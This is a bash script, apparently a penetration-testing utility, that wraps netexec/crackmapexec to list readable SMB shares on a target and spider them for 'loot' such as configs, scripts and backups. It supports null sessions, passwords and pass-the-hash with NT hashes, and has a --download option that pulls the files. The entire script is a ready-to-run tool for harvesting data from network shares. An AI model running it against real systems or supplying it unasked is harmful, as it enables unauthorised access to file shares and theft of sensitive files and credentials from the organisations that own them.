#!/usr/bin/env bash
#
# smb-loot.sh
#
# List readable SMB shares on a host and spider them for interesting files using
# netexec's spider_plus module. Credentialed or null session. A quick way to
# find loot (configs, scripts, backups) sitting on open shares.
#
# Usage:
#   ./smb-loot.sh 10.0.0.5 -u jdoe -p 'Passw0rd!' -d corp.local
#   ./smb-loot.sh 10.0.0.5 -u guest -p '' --out ~/eng/loot
#   ./smb-loot.sh 10.0.0.5 -u jdoe -H <nthash> -d corp.local --download
#
set -uo pipefail

USER=""
PASS=""
NTHASH=""
DOMAIN=""
OUT=""
DOWNLOAD=0

die()  { echo "ERROR: $*" >&2; exit 1; }
have() { command -v "$1" >/dev/null 2>&1; }

usage() {
  grep '^#' "$0" | sed 's/^# \{0,1\}//' | sed '/^!/d'
  exit "${1:-0}"
}

cme_bin() {
  if have nxc; then echo nxc
  elif have netexec; then echo netexec
  elif have crackmapexec; then echo crackmapexec
  else return 1; fi
}

# --- parse args -----------------------------------------------------------
TARGET=""
while [ $# -gt 0 ]; do
  case "$1" in
    -h|--help)   usage 0 ;;
    -u|--user)   shift; USER="$1" ;;
    -p|--pass)   shift; PASS="$1" ;;
    -H|--hash)   shift; NTHASH="$1" ;;
    -d|--domain) shift; DOMAIN="$1" ;;
    --out|-o)    shift; [ $# -gt 0 ] || die "--out needs a path"; OUT="$1" ;;
    --out=*)     OUT="${1#*=}" ;;
    --download)  DOWNLOAD=1 ;;
    -*)          die "Unknown option: $1 (try --help)" ;;
    *)           [ -z "$TARGET" ] || die "Only one target allowed."; TARGET="$1" ;;
  esac
  shift
done
[ -n "$TARGET" ] || { echo "No target given." >&2; usage 2; }
[ -n "$USER" ]   || { echo "No user (-u) given (use -u guest -p '' for a null-ish session)." >&2; usage 2; }

CME=$(cme_bin) || die "netexec/crackmapexec not found."
slug=$(printf '%s' "$TARGET" | tr -cd 'a-zA-Z0-9._-')
[ -n "$OUT" ] || OUT="./smb-loot_${slug}"
mkdir -p "$OUT" || die "Cannot create $OUT"

# Assemble auth.
AUTH=(-u "$USER")
if   [ -n "$NTHASH" ]; then AUTH+=(-H "$NTHASH")
else AUTH+=(-p "$PASS"); fi
[ -n "$DOMAIN" ] && AUTH+=(-d "$DOMAIN")

echo ">> Target : $TARGET   User: $USER   Output: $OUT"

echo ">> Listing shares..."
"$CME" smb "$TARGET" "${AUTH[@]}" --shares | tee "$OUT/shares.txt"

echo
echo ">> Spidering readable shares (spider_plus)..."
# spider_plus writes JSON metadata (and files if DOWNLOAD) under its output dir.
mod_opts=()
[ "$DOWNLOAD" -eq 1 ] && mod_opts=(-o DOWNLOAD_FLAG=True OUTPUT_FOLDER="$OUT/spider")
if "$CME" smb "$TARGET" "${AUTH[@]}" -M spider_plus "${mod_opts[@]}" > "$OUT/spider.log" 2>&1; then
  echo "   spider_plus done; see $OUT/spider.log"
  # netexec's spider_plus defaults to /tmp/nxc_hosted or ~/.nxc/modules/nxc_spider_plus
  for d in "$OUT/spider" /tmp/nxc_hosted "$HOME/.nxc/modules/nxc_spider_plus"; do
    [ -d "$d" ] && echo "   output likely under: $d"
  done
else
  echo "   spider_plus failed (module name/version may differ); check $OUT/spider.log"
fi

echo
echo "================ SUMMARY ================"
echo "Shares list : $OUT/shares.txt"
echo "Spider log  : $OUT/spider.log"
[ "$DOWNLOAD" -eq 1 ] && echo "Downloads   : $OUT/spider (if the module supported it)"
echo "Tip: rerun with --download to pull files, not just metadata."
echo "========================================"
